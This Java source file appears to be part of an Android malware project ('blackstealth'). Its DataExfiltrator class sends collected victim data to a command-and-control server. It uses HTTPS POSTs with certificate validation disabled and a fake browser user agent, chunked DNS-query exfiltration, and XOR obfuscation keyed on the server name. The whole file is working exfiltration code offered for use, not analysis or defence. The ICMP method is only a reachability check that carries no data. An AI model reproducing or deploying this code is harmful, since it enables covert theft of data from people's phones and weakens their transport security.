package com.offensive.blackstealth.gathering;

import android.util.Base64;
import android.util.Log;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import javax.net.ssl.*;

/**
 * DataExfiltrator - Exfiltrates collected data to C2 server
 */
public class DataExfiltrator {
    private static final String TAG = "DataExfiltrator";
    
    private String c2Server;
    private int c2Port;
    private boolean useEncryption;
    private ExecutorService executor;
    private BlockingQueue<ExfilData> queue;
    private boolean isRunning = false;
    
    public static class ExfilData {
        public String type;
        public byte[] data;
        public int priority;
        public long timestamp;
        
        public ExfilData(String type, byte[] data, int priority) {
            this.type = type;
            this.data = data;
            this.priority = priority;
            this.timestamp = System.currentTimeMillis();
        }
    }
    
    public DataExfiltrator(String server, int port) {
        this.c2Server = server;
        this.c2Port = port;
        this.useEncryption = true;
        this.executor = Executors.newFixedThreadPool(2);
        this.queue = new PriorityBlockingQueue<>(100, 
            Comparator.comparingInt((ExfilData d) -> -d.priority));
    }
    
    /**
     * Start the exfiltration worker
     */
    public void start() {
        if (isRunning) return;
        isRunning = true;
        
        executor.submit(() -> {
            while (isRunning) {
                try {
                    ExfilData data = queue.poll(5, TimeUnit.SECONDS);
                    if (data != null) {
                        sendData(data);
                    }
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        });
    }
    
    public void stop() {
        isRunning = false;
        executor.shutdownNow();
    }
    
    /**
     * Queue data for exfiltration
     */
    public void queueData(String type, byte[] data, int priority) {
        queue.offer(new ExfilData(type, data, priority));
    }
    
    public void queueData(String type, String data, int priority) {
        queueData(type, data.getBytes(), priority);
    }
    
    /**
     * Send data to C2 server via HTTPS
     */
    private boolean sendData(ExfilData data) {
        try {
            URL url = new URL("https://" + c2Server + ":" + c2Port + "/exfil");
            HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
            
            // Accept any certificate (for self-signed C2)
            conn.setSSLSocketFactory(getTrustAllSSLSocketFactory());
            conn.setHostnameVerifier((hostname, session) -> true);
            
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(30000);
            
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            conn.setRequestProperty("X-Data-Type", data.type);
            conn.setRequestProperty("X-Timestamp", String.valueOf(data.timestamp));
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            
            byte[] payload = useEncryption ? encrypt(data.data) : data.data;
            String encoded = Base64.encodeToString(payload, Base64.NO_WRAP);
            
            OutputStream os = conn.getOutputStream();
            os.write(encoded.getBytes());
            os.flush();
            os.close();
            
            int responseCode = conn.getResponseCode();
            conn.disconnect();
            
            return responseCode == 200;
        } catch (Exception e) {
            Log.e(TAG, "Exfiltration failed: " + e.getMessage());
            // Re-queue with lower priority
            if (data.priority > 0) {
                queue.offer(new ExfilData(data.type, data.data, data.priority - 1));
            }
            return false;
        }
    }
    
    /**
     * Send data via DNS exfiltration
     */
    public void sendViaDns(String data) {
        String encoded = Base64.encodeToString(data.getBytes(), 
            Base64.URL_SAFE | Base64.NO_WRAP);
        
        // Split into chunks
        int chunkSize = 60;
        for (int i = 0; i < encoded.length(); i += chunkSize) {
            String chunk = encoded.substring(i, Math.min(i + chunkSize, encoded.length()));
            String query = chunk + "." + (i / chunkSize) + "." + c2Server;
            
            executor.submit(() -> {
                try {
                    InetAddress.getByName(query);
                } catch (UnknownHostException e) {
                    // Expected - data is in the DNS query
                }
            });
        }
    }
    
    /**
     * Send data via ICMP (requires root)
     */
    public boolean sendViaIcmp(byte[] data) {
        try {
            InetAddress target = InetAddress.getByName(c2Server);
            return target.isReachable(1000);
        } catch (Exception e) {
            return false;
        }
    }
    
    private byte[] encrypt(byte[] data) {
        // Simple XOR encryption
        byte[] key = c2Server.getBytes();
        byte[] result = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            result[i] = (byte) (data[i] ^ key[i % key.length]);
        }
        return result;
    }
    
    private SSLSocketFactory getTrustAllSSLSocketFactory() throws Exception {
        TrustManager[] trustAll = new TrustManager[]{
            new X509TrustManager() {
                public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String t) {}
                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String t) {}
            }
        };
        
        SSLContext sc = SSLContext.getInstance("TLS");
        sc.init(null, trustAll, new java.security.SecureRandom());
        return sc.getSocketFactory();
    }
    
    public int getQueueSize() {
        return queue.size();
    }
}
